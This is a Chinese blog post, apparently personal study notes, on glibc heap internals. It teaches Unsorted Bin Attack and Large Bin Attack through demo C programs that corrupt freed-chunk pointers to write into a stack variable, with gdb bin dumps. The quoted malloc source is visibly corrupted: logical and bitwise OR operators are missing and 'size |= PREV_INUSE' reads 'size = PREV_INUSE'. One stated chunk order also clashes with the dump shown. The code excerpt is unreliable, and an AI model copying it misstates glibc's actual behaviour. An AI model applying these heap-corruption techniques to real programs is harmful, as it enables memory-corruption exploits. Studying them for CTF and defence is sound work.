<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>关于如何理解Glibc堆管理器(Ⅴ——从Large Bin Attack理解malloc对Bins的分配) | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>关于如何理解Glibc堆管理器(Ⅴ——从Large Bin Attack理解malloc对Bins的分配)</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2021-08-07T12:20:20.000Z" id="date"> 2021-08-07</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-29T04:50:34.994Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<p>本篇实为个人笔记，可能存在些许错误；若各位师傅发现哪里存在错误，还望指正。感激不尽。</p>
<p>若有图片及文稿引用，将在本篇结尾处著名来源(也有置于篇首的情况)。</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>        同样先引用如下两篇文章。如果读者能够通过如下三篇文章掌握Large Bin Attack，那么本篇便只是附带品，没有什么其他内容</p>
<p><a target="_blank" rel="noopener" href="https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/">https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-262424.htm">https://bbs.pediy.com/thread-262424.htm</a></p>
<h2 id="条件背景："><a href="#条件背景：" class="headerlink" title="条件背景："></a>条件背景：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>&#123;<br>    bck = victim-&gt;bk;<br>    if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)<br>         __builtin_expect (chunksize_nomask (victim)<br>                   &gt; av-&gt;system_mem, 0))<br>            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,<br>                             chunk2mem (victim), av);<br>    size = chunksize (victim);<br> <br>    /*<br>      If a small request, try to use last remainder if it is the<br>      only chunk in unsorted bin.  This helps promote locality for<br>      runs of consecutive small requests. This is the only<br>      exception to best-fit, and applies only when there is<br>      no exact fit for a small chunk.<br>    */<br> <br>    if (in_smallbin_range (nb) &amp;&amp;<br>        bck == unsorted_chunks (av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))<br>    &#123;<br>        /* split and reattach remainder */<br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset (victim, nb);<br>        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>        av-&gt;last_remainder = remainder;<br>        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>        if (!in_smallbin_range (remainder_size))<br>        &#123;<br>            remainder-&gt;fd_nextsize = NULL;<br>            remainder-&gt;bk_nextsize = NULL;<br>        &#125;<br> <br>        set_head (victim, nb  PREV_INUSE <br>                  (av != &amp;main_arena ? NON_MAIN_ARENA : 0));<br>        set_head (remainder, remainder_size  PREV_INUSE);<br>        set_foot (remainder, remainder_size);<br> <br>        check_malloced_chunk (av, victim, nb);<br>        void *p = chunk2mem (victim);<br>        alloc_perturb (p, bytes);<br>        return p;<br>    &#125;<br> <br>    /* remove from unsorted list */<br>    unsorted_chunks (av)-&gt;bk = bck;<br>    bck-&gt;fd = unsorted_chunks (av);<br> <br>    /* Take now instead of binning if exact fit */<br> <br>    if (size == nb)<br>    &#123;<br>         set_inuse_bit_at_offset (victim, size);<br>         if (av != &amp;main_arena)<br>             set_non_main_arena (victim);<br>         check_malloced_chunk (av, victim, nb);<br>         void *p = chunk2mem (victim);<br>         alloc_perturb (p, bytes);<br>         return p;<br>    &#125;<br> <br>    /* place chunk in bin */<br>    if (in_smallbin_range (size))<br>    &#123;<br>        victim_index = smallbin_index (size);<br>        bck = bin_at (av, victim_index);<br>        fwd = bck-&gt;fd;<br>    &#125;<br>    else<br>    &#123;<br>        victim_index = largebin_index (size);<br>        bck = bin_at (av, victim_index);<br>        fwd = bck-&gt;fd;<br> <br>        /* maintain large bins in sorted order */<br>        if (fwd != bck)<br>        &#123;<br>             /* Or with inuse bit to speed comparisons */<br>             size = PREV_INUSE;<br>             /* if smaller than smallest, bypass loop below */<br>             assert (chunk_main_arena (bck-&gt;bk));<br>             if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))<br>             &#123;<br>                 fwd = bck;<br>                 bck = bck-&gt;bk;<br>                 victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>              else<br>              &#123;<br>                  assert (chunk_main_arena (fwd));<br>                  while ((unsigned long) size &lt; chunksize_nomask (fwd))<br>                  &#123;<br>                      fwd = fwd-&gt;fd_nextsize;<br>                      assert (chunk_main_arena (fwd));<br>                  &#125;<br> <br>                  if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))<br>                        /* Always insert in the second position.  */<br>                        fwd = fwd-&gt;fd;<br>                  else<br>                  &#123;<br>                      victim-&gt;fd_nextsize = fwd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                      fwd-&gt;bk_nextsize = victim;<br>                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                  bck = fwd-&gt;bk;<br>              &#125;<br>          &#125;<br>          else<br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>    &#125;<br> <br> <br> <br>    mark_bin (av, victim_index);<br>    victim-&gt;bk = bck;<br>    victim-&gt;fd = fwd;<br>    fwd-&gt;bk = victim;<br>    bck-&gt;fd = victim;<br> <br>#define MAX_ITERS       10000<br>    if (++iters &gt;= MAX_ITERS)<br>        break;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/9bd8e77b-cc17-4b30-9170-a22964eda175'><img src="blob:https://tokameine.top/9bd8e77b-cc17-4b30-9170-a22964eda175"></p>
<p>        该代码主要阐述：当管理器从Unsorted Bin中取出chunk置入对应Bins的时，如何判断置入何处、做出哪些相应修改。</p>
<p>        如果读者并不熟悉这段代码，并对其中的变量名感到困惑，可以暂且搁置，笔者将在后续补充这些内容以方便理解该代码。</p>
<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><ul>
<li>        Unsorted Bin是先进后出(在两个chunk都满足malloc请求时先操作后入的)</li>
<li>        Unsorted Bin是无序且紧凑的，放入该结构中的相邻chunk将被合并且直接放入头部</li>
<li>        Large Bins的链表是有序的，排序规则为降序</li>
<li>        了解bk_nextsize、fd_nextsize、bk、fd指针的指向目标</li>
<li>        待补充</li>
</ul>
<h2 id="Unsorted-Bin-Attack："><a href="#Unsorted-Bin-Attack：" class="headerlink" title="Unsorted Bin Attack："></a>Unsorted Bin Attack：</h2><p>        在解释Large Bin Attack之前，我觉得有必要先从Unsorted Bin Attack开始。笔者认为这将有助于读者理解之后的内容。如下内容摘自：CTF-WIKI</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsorted Bin Attack  该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关</p>
<p>Unsorted Bin Attack  被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针</p>
<p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值(该值不可控)</p>
<h3 id="范例代码：-howtoheap2——unsorted-bin-attack"><a href="#范例代码：-howtoheap2——unsorted-bin-attack" class="headerlink" title="范例代码：(howtoheap2——unsorted_bin_attack)"></a>范例代码：(howtoheap2——unsorted_bin_attack)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br><br>int main()&#123;<br><br>unsigned long stack_var=0;<br><br>unsigned long *p=malloc(400);<br><br>malloc(500);<br><br>free(p);<br><br>p[1]=(unsigned long)(&amp;stack_var-2);<br><br>malloc(400);<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/330886b2-85f3-47a6-829f-71095636092c'><img src="blob:https://tokameine.top/330886b2-85f3-47a6-829f-71095636092c"></p>
<p>         笔者删去了所有的fprintf以让上述代码看起来更加整洁，读者可以自行对代码进行调整</p>
<h3 id="代码调试："><a href="#代码调试：" class="headerlink" title="代码调试："></a>代码调试：</h3><p>        运行上述程序到第13行；第二次malloc将  p 与Top chunk隔离，使其在free(p)时不会直接被并入Top chunk</p>
<p>        此时的Bins中为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ bins<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/dd666ad2-9b6d-45de-9d71-7e23da0f8c73'><img src="blob:https://tokameine.top/dd666ad2-9b6d-45de-9d71-7e23da0f8c73"></p>
<p>        对于不使用Fast Bins的chunk来说，在free时会先将其置入Unsorted Bin中</p>
<p>        由于用户没有将 p 指针置NULL，因此我们能够通过操作 p 指针来改变 chunk的数据(14行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ heap<br>0x602000 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x1a1, <br>  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, <br>  bk = 0x7fffffffde08, <br>  fd_nextsize = 0x0, <br>  bk_nextsize = 0x0<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/7bb1d79e-1027-4290-bb74-d0187884081f'><img src="blob:https://tokameine.top/7bb1d79e-1027-4290-bb74-d0187884081f"></p>
<p>        如上是修改后的 chunk p</p>
<p>        其bk被指向了栈中的某个位置</p>
<p>        而在第15行将申请一个0x400大小的chunk，刚好能够由 p 分配，则管理器将其从Bin中取出，此时发生了Unsorted Bin Attack，我们可以从条件背景中摘录部分关键代码来解释这个现象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/* remove from unsorted list */<br>if (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/a2eb4ec0-ca81-4cc8-a825-3588797a4d1d'><img src="blob:https://tokameine.top/a2eb4ec0-ca81-4cc8-a825-3588797a4d1d"></p>
<p>        注：unsorted_chunks (av)返回指向 Unsorted Bin表头的指针，其bk指针指向最后一个节点</p>
<p>        注：victim表示Unsorted Bin中最后一个节点</p>
<p>        注：此处的bck &#x3D; victim-&gt;bk;</p>
<p>        该段代码作用为：</p>
<ul>
<li>将倒数第二个节点作为最后一个节点</li>
<li>将倒数第二个节点的下一个节点指向表头</li>
</ul>
<p>       正常的操作当然不会引发问题，这两个操作成功将最后一个节点从Unsorted Bin中摘除</p>
<p>        但范例中的bck&#x3D;&amp;stack_var-2，如果此时调用malloc，则摘除 chunk p ，触发上述情况</p>
<p>        bck-&gt;fd处将被写入表头地址，这个地址并不是我们能够控制的，只能表示一个较大的值罢了</p>
<p>        在用于修改一些长度限制时有奇效，但除此之外似乎并没有特别的用处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ p stack_var <br>$1 = 0x7ffff7dd1b78<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/cb71ed04-19d9-4120-a73e-8c60981390c4'><img src="blob:https://tokameine.top/cb71ed04-19d9-4120-a73e-8c60981390c4"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x602000 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x1a1, <br>  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, <br>  bk = 0x7fffffffde08, <br>  fd_nextsize = 0x0, <br>  bk_nextsize = 0x0<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/dfd7740b-6da0-43dd-a5e9-f97263252ab5'><img src="blob:https://tokameine.top/dfd7740b-6da0-43dd-a5e9-f97263252ab5"></p>
<p>         可以发现，这个值stack_var的值被写为了表头地址</p>
<h2 id="Large-Bin-Attack："><a href="#Large-Bin-Attack：" class="headerlink" title="Large Bin Attack："></a>Large Bin Attack：</h2><p>        比起说明，笔者认为直接用代码更加便于理解</p>
<p>        下示范例摘自参考文章第一个链接中的范例</p>
<h3 id="范例代码："><a href="#范例代码：" class="headerlink" title="范例代码："></a>范例代码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;<br> <br>int main()<br>&#123;<br>    unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;<br>    unsigned long *p;<br>    unsigned long stack[8] = &#123;0&#125;;<br>    printf(&quot;stack address: %p\n&quot;, &amp;stack);<br>    p1 = malloc(0x3f0);<br>    p2 = malloc(0x20);<br>    p3 = malloc(0x400);<br>    p4 = malloc(0x20);<br>    p5 = malloc(0x400);<br>    p6 = malloc(0x20);<br>    p7 = malloc(0x120);<br>    p8 = malloc(0x20);<br>    p9 = malloc(0x140);<br>    p10 = malloc(0x20);<br>    p11 = malloc(0x400);<br>    p12 = malloc(0x20);<br>    free(p7);<br>    free(p9);<br> <br>    p = malloc(0x60);<br>    p = malloc(0xb0);<br> <br>    free(p1);<br>    free(p3);<br>    free(p5);<br> <br>    p = malloc(0x60);<br> <br>    free(p11);<br><br>    //step 2-3-2-1<br>    //*(p1-1) = 0x421;<br>    //p = malloc(0x60);<br>     <br>    //step 2-3-2-2-1<br>    //p = malloc(0x60);<br>     <br>    //step 2-3-2-2-2<br>    //*(p3-1) = 0x3f1;<br>    //p = malloc(0x60);<br><br>//  Attack part<br>/*<br>    *(p3-1) = 0x3f1;<br>    *(p3) = (unsigned long)(&amp;stack);<br>    *(p3+1) = (unsigned long)(&amp;stack);<br>    *(p3+2) = (unsigned long)(&amp;stack);<br>    *(p3+3) = (unsigned long)(&amp;stack);<br>    // trigger malicious malloc<br>    p = malloc(0x60);<br><br>*/<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/437b866f-6317-4dc4-81fb-5636cbfa63aa'><img src="blob:https://tokameine.top/437b866f-6317-4dc4-81fb-5636cbfa63aa"></p>
<h3 id="代码调试：-1"><a href="#代码调试：-1" class="headerlink" title="代码调试："></a>代码调试：</h3><p>        首先断点定于25行，此时的Unsorted Bins中已放入p7，p9</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602e10 —▸ 0x602cb0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602e10<br>smallbins<br>empty<br><br>gdb-peda$ p p7<br>$1 = (unsigned long *) 0x602cc0<br>gdb-peda$ p p9<br>$2 = (unsigned long *) 0x602e20<br><br>0x602cb0 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x131, <br>  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, <br>  bk = 0x602e10, <br>  fd_nextsize = 0x0, <br>  bk_nextsize = 0x0<br>&#125;<br>0x602e10 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x151, <br>  fd = 0x602cb0, <br>  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, <br>  fd_nextsize = 0x0, <br>  bk_nextsize = 0x0<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/e8a0d07f-5293-4acb-b190-e45432e3f38d'><img src="blob:https://tokameine.top/e8a0d07f-5293-4acb-b190-e45432e3f38d"></p>
<p>        当用户malloc(0x60)时候，将把p7取出并切割分配给用户，并将剩余部分重新放回Unsorted Bin，再往前将其他块(此处为p9)放入对应的Bins中，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602d20 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602d20 /* &#x27; -`&#x27; */<br>smallbins<br>0x150: 0x602e10 —▸ 0x7ffff7dd1cb8 (main_arena+408) ◂— 0x602e10<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/66dede3b-43cf-4baf-91a7-0c6f6825b05f'><img src="blob:https://tokameine.top/66dede3b-43cf-4baf-91a7-0c6f6825b05f"></p>
<p> <strong>这里有几个细节需要注意：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/5e0a4398-498a-4d7a-b4af-900651202ab0'><img src="blob:https://tokameine.top/5e0a4398-498a-4d7a-b4af-900651202ab0"></p>
<p>        如上是条件背景第一行，它将victim定为链表的最后一个单元，这意味着Unsorted Bin是从后往前遍历的(因此是先p7，再p9)</p>
<p>        p7是小于p9的，它在Small Bin数组中应该位于索引较低的链表上；而申请结束后，p9被放入Small Bin，而p7被切割后放回Unsorted Bin，这意味着Small Bin是从低索引往高索引遍历的</p>
<p>        <strong>注：</strong>有一个名为mark_bin (av, victim_index)的函数，它会将以victim_index为索引的chunk标记为”有空闲块“，因此扫描时总是先扫描该Bin有无空闲块，然后再往下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x0<br>smallbins<br>0x150: 0x602e10 —▸ 0x7ffff7dd1cb8 (main_arena+408) ◂— 0x602e10<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/798096af-e6e2-4e53-9a86-7e128b6eae17'><img src="blob:https://tokameine.top/798096af-e6e2-4e53-9a86-7e128b6eae17"></p>
<p>        再一次申请，由于刚好大小符合Unsorted Bin，因此直接摘除</p>
<p>        接下来一直运行到第32行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602870 —▸ 0x602430 —▸ 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602870 /* &#x27;p(`&#x27; */<br>smallbins<br>0x150: 0x602e10 —▸ 0x7ffff7dd1cb8 (main_arena+408) ◂— 0x602e10<br>largebins<br>empty<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/6b10c7b9-7055-42b7-af23-1bc4ab24abd8'><img src="blob:https://tokameine.top/6b10c7b9-7055-42b7-af23-1bc4ab24abd8"></p>
<p>         p1、p3、p5都比较大，属于Large Bin的范畴，而再次申请后的Bins将如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602e80 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602e80<br>smallbins<br>empty<br>largebins<br>0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602430 /* &#x27;0$`&#x27; */<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/94e1b845-1c4d-40a5-a04c-2acf45f04c4d'><img src="blob:https://tokameine.top/94e1b845-1c4d-40a5-a04c-2acf45f04c4d"></p>
<p>        可以看见，顺序为p2——&gt;p3——&gt;p1，且存放在同一个Large Bin中(Large Bin有六十多个)</p>
<p>        他们实则是降序排列的，但p2和p3由于大小相同，似乎不太好分辨相同size时该如何处理，这个疑问将在接下来注释的代码段中阐明，暂且继续往下：</p>
